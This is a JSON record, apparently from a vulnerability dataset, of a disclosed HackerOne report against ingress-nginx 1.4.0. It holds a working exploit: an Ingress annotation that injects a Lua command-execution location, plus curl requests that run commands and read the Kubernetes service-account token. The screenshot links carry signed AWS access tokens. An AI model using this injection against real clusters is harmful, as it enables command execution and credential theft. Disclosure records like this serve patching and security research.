@@ -1,0 +1,53 @@
+{
+    "reported_to": "Kubernetes",
+    "reported_by": "suanve ",
+    "title": "Ingress nginx annotation injection causes arbitrary command execution",
+    "content": "\nReport Submission Form\nSummary:\n[add a summary of the vulnerability]\nFor CVE-2021-25742 and CVE-2021-25746, I found a bypass method, which is fatal to the current measures taken by the team\nI can easily bypass restrictions and execute arbitrary commands in the express nginx container.\n## Kubernetes Version:\n[add Kubernetes version & distribution in which the issue was found]\nServer Version: version.Info{Major:\"1\", Minor:\"25\", GitVersion:\"v1.25.2\", GitCommit:\"5835544ca568b757a8ecae5c153f317e5736700e\", GitTreeState:\"clean\", BuildDate:\"2022-09-21T14:27:13Z\", GoVersion:\"go1.19.1\", Compiler:\"gc\", Platform:\"linux/arm64\"}\nComponent Version:\n[if applicable, add component version the issue was found]\ningress-nginx/controller-v1.4.0\nhttps://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.4.0/deploy/static/provider/cloud/deploy.yaml\nSteps To Reproduce:\n[add details for how we can reproduce the issue, including relevant cluster setup and configuration]\nIn the latest version (1.4.0), alias was blacklisted,However, nginx supports lua. I can use other watches to insert any location configuration items.\nIt is meaningless to simply restrict alias instructions. Your team should start from multiple perspectives.\nminikube start\nkubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.4.0/deploy/static/provider/cloud/deploy.yaml\n\nWe use nginx. ingress. kubernetes The io/configuration snippet annotation can be found in nginx Insert a new location in conf and execute any command through lua.\nCode 795 Bytes\n1cat > su.yml<<EOF\n2apiVersion: networking.k8s.io/v1\n3kind: Ingress\n4metadata:\n5  name: ingress-exploit\n6  annotations:\n7    kubernetes.io/ingress.class: \"nginx\"\n8    nginx.ingress.kubernetes.io/configuration-snippet: |\n9      more_set_headers \"suanve\"\n10            proxy_pass http://upstream_balancer;\n11                                proxy_redirect                          off;\n12        }\n13        location /suanve/ { content_by_lua_block { local rsfile = io.popen(ngx.req.get_headers()[\"cmd\"]);local rschar = rsfile:read(\"*all\");ngx.say(rschar); } } location /fs/{\n14spec:\n15  rules:\n16  - host: suanve.susec.me\n17    http:\n18      paths:\n19      - path: /\n20        pathType: Prefix\n21        backend:\n22          service:\n23            name: exploit\n24            port:\n25              number: 80\n26\n27EOF\n28\n29kubectl apply -f su.yml\nThis will cause the nginx configuration to be tampered with. We can execute any command in the corresponding ingress.\nCode 476 Bytes\n1curl -v -H 'Host: suanve.susec.me' -H \"cmd: id\" 127.0.0.1/suanve/\n2*   Trying 127.0.0.1:80...\n3* Connected to 127.0.0.1 (127.0.0.1) port 80 (#0)\n4> GET /suanve/ HTTP/1.1\n5> Host: suanve.susec.me\n6> User-Agent: curl/7.79.1\n7> Accept: */*\n8> cmd: id\n9>\n10* Mark bundle as not supporting multiuse\n11< HTTP/1.1 200 OK\n12< Date: Mon, 10 Oct 2022 09:58:18 GMT\n13< Content-Type: text/html\n14< Transfer-Encoding: chunked\n15< Connection: keep-alive\n16<\n17uid=101(www-data) gid=82(www-data) groups=82(www-data)\nConnection #0 to host 127.0.0.1 left intact\nCode 516 Bytes\n1GET /suanve/ HTTP/1.1\n2Host: suanve.susec.me\n3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0\n4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n5Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n6Accept-Encoding: gzip, deflate\n7Connection: close\n8Upgrade-Insecure-Requests: 1\n9cmd: cat /var/run/secrets/kubernetes.io/serviceaccount/token\n10X-Originating-IP: 127.0.0.1\n11X-Remote-IP: 127.0.0.1\n12Content-Length: 2\n13\n14\n15\nSupporting Material/References:\n<image_0>\n<image_1>\n[attachment / reference]\nhttps://hackerone.com/reports/1378175\nhttps://github.com/kubernetes/ingress-nginx/issues/8503\nImpact\nArbitrary command execution\nGet kubernetes credentials\n\n",
+    "severity": [
+        7.6,
+        null
+    ],
+    "bounty": 2500,
+    "weaknesses": [
+        "Code Injection"
+    ],
+    "screenshots": {
+        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/f68jhxos84ekzpd17yblez3h7pv5?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXSYNEIXS%2F20250324%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250324T225135Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCID34EjFczoP1AjX9wTcrwX01Xh5LYwoYOnMQLlFVYWIdAiBbpQJSkWEQhhnP3zcCVWrbrTi80fcQqNnBE8AA5rSIESq7BQjz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMcwXVHg4YyWhz8TFvKo8FtD4c5BjMeV125K1w41MsQxaE1Z5piY%2BWYCLuJ8C9JHEMnMYc3et02nod3A%2BV%2FBSXZdbnE5ZvakUuemlcfJMPCy0qgJgN3skRaRmIN1j10kqsgeZd0Yn4nNcUA2cSIjqArKICHRDMnNN6bE5GQvWFLG3FZC%2FlFNUfhfQjqs08gAkby3R4JiEzxQqu5K%2B1vft1i8pQKsRwVopPhvRiib7qlOtVmRTavaSuxo%2Fkk1ZufJPA0TJoaUbc0GnZQKEQFeh2VovdSQ4Kam2yPUX8bZMHUWdcZiy%2BDvomf%2BnHVVkH2Lxr0y35m6siQOhGyu%2Fh%2BdOGGWcUqKa9Q%2B4NGLChKi98JfXJsEEDN7uyg%2FF1ZooLggIR3erogeGigVX2On22hhXFTBl0%2FgPm0i9WzK2NkZUOaN%2FG%2FODK1pLJrTj7lQDO0pbGEzWGtCxE0NnVUizsZ3d43936aiXwE0DBS00hgTuOs1ueqt%2FiZTip0cRns7WVtQyGRvCrldyrIubIKnRXPrMxGTYM2kezEn1UFC6Xd8YYWXzZeb%2FoodNtNHg7Ej%2BbuAhVCx7lDf8gLQiBZeriKB0ozSTuH8%2FndYVkG7YnrkDnjqmwf8lEDBHlVcZQURxTD4Ga%2BBpMZlcwjtoZmxL6tgFhRgbIqRzV42DjMCvOXRPiT9tMqR%2BYFAnJMshgnQPmPCdJxnmFaHOUEvTqJGZcta73Wu6OL3S8Bq9qmdbNTNWcVGCIuad53Hdwy70ISiTxN47Gyna1m4smeriDZN%2B%2FdqrD%2FFCfKhzWIY7XidizbSbUT%2B43QALV2taxtJOXsp1gC7oxOM%2FuxqZizYF3buHt9JgpoEsIfPsaKDzMdxUGIhJFiUICpXbmWigsg4j%2FwFoSJDCPuoa%2FBjqyAS78m2TJbVWqb8BNA%2F73N%2FLA63wIYtada0tGJZOhUibVMnsoUL1s6ymAhEPtcjyeVzTXVNSB0J3%2BiIIEahreNu5Cj8GeEwW1jfNps%2BL3Fp2E%2Bh%2FFoRQCh0J%2FjnTQ%2FpOunsHejVL1BL0uGcuniNEYPtmoBs2jlO%2FU6SplGcVe2tKr%2BVg12L5eAMdUMEkSIlphDSSfMKrC6teFB%2F1%2FzdPIgIijpFXu6ca%2F80iTNr3GVaFgiIM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bea37f4d0eafa8ce62695949c91c4cce363f83c4a1c1fd866a50bb34e0d0f4ca",
+        "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/re8h85yt3p2e37skauq20u0prar6?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXSYNEIXS%2F20250324%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250324T225135Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCID34EjFczoP1AjX9wTcrwX01Xh5LYwoYOnMQLlFVYWIdAiBbpQJSkWEQhhnP3zcCVWrbrTi80fcQqNnBE8AA5rSIESq7BQjz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMcwXVHg4YyWhz8TFvKo8FtD4c5BjMeV125K1w41MsQxaE1Z5piY%2BWYCLuJ8C9JHEMnMYc3et02nod3A%2BV%2FBSXZdbnE5ZvakUuemlcfJMPCy0qgJgN3skRaRmIN1j10kqsgeZd0Yn4nNcUA2cSIjqArKICHRDMnNN6bE5GQvWFLG3FZC%2FlFNUfhfQjqs08gAkby3R4JiEzxQqu5K%2B1vft1i8pQKsRwVopPhvRiib7qlOtVmRTavaSuxo%2Fkk1ZufJPA0TJoaUbc0GnZQKEQFeh2VovdSQ4Kam2yPUX8bZMHUWdcZiy%2BDvomf%2BnHVVkH2Lxr0y35m6siQOhGyu%2Fh%2BdOGGWcUqKa9Q%2B4NGLChKi98JfXJsEEDN7uyg%2FF1ZooLggIR3erogeGigVX2On22hhXFTBl0%2FgPm0i9WzK2NkZUOaN%2FG%2FODK1pLJrTj7lQDO0pbGEzWGtCxE0NnVUizsZ3d43936aiXwE0DBS00hgTuOs1ueqt%2FiZTip0cRns7WVtQyGRvCrldyrIubIKnRXPrMxGTYM2kezEn1UFC6Xd8YYWXzZeb%2FoodNtNHg7Ej%2BbuAhVCx7lDf8gLQiBZeriKB0ozSTuH8%2FndYVkG7YnrkDnjqmwf8lEDBHlVcZQURxTD4Ga%2BBpMZlcwjtoZmxL6tgFhRgbIqRzV42DjMCvOXRPiT9tMqR%2BYFAnJMshgnQPmPCdJxnmFaHOUEvTqJGZcta73Wu6OL3S8Bq9qmdbNTNWcVGCIuad53Hdwy70ISiTxN47Gyna1m4smeriDZN%2B%2FdqrD%2FFCfKhzWIY7XidizbSbUT%2B43QALV2taxtJOXsp1gC7oxOM%2FuxqZizYF3buHt9JgpoEsIfPsaKDzMdxUGIhJFiUICpXbmWigsg4j%2FwFoSJDCPuoa%2FBjqyAS78m2TJbVWqb8BNA%2F73N%2FLA63wIYtada0tGJZOhUibVMnsoUL1s6ymAhEPtcjyeVzTXVNSB0J3%2BiIIEahreNu5Cj8GeEwW1jfNps%2BL3Fp2E%2Bh%2FFoRQCh0J%2FjnTQ%2FpOunsHejVL1BL0uGcuniNEYPtmoBs2jlO%2FU6SplGcVe2tKr%2BVg12L5eAMdUMEkSIlphDSSfMKrC6teFB%2F1%2FzdPIgIijpFXu6ca%2F80iTNr3GVaFgiIM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8ff7e698833fab0d611a24f26739843154571803f500dc624adff25ee74dd337"
+    },
+    "disclosed_date": 1700878980,
+    "report_url": "https://hackerone.com/reports/1728174",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "HIGH",
+    "vuln_category": "API",
+    "steps": [
+        [
+            1,
+            "Set up a Kubernetes cluster with ingress-nginx controller version 1.4.0."
+        ],
+        [
+            2,
+            "Create an Ingress resource with a malicious configuration-snippet annotation that injects Lua code to execute arbitrary commands."
+        ],
+        [
+            3,
+            "Apply the Ingress resource to the cluster using kubectl."
+        ],
+        [
+            4,
+            "Send a crafted HTTP request to the Ingress endpoint with a command in the headers to execute arbitrary commands in the nginx container."
+        ]
+    ],
+    "vuln_description": "The vulnerability allows an attacker to bypass security restrictions in the ingress-nginx controller by injecting malicious Lua code through the configuration-snippet annotation. This leads to arbitrary command execution within the nginx container, potentially compromising the Kubernetes cluster.",
+    "reason": "The attack requires knowledge of Kubernetes Ingress resources, nginx configuration, and Lua scripting. The bypass of security measures is non-obvious and involves manipulating the nginx configuration in a subtle way.",
+    "new_complexity": "HIGH",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": "1378175",
+    "authnz_metadata": {
+        "reason": "The vulnerability involves bypassing restrictions in the ingress-nginx configuration to execute arbitrary commands via Lua injection. This is not directly related to authentication or authorization boundaries between users or resources within the same application, but rather a configuration bypass in the ingress controller itself. The methodology described focuses on testing user sessions and resource access within an application, not system-level command execution vulnerabilities.",
+        "is_detectable": false
+    }
+}
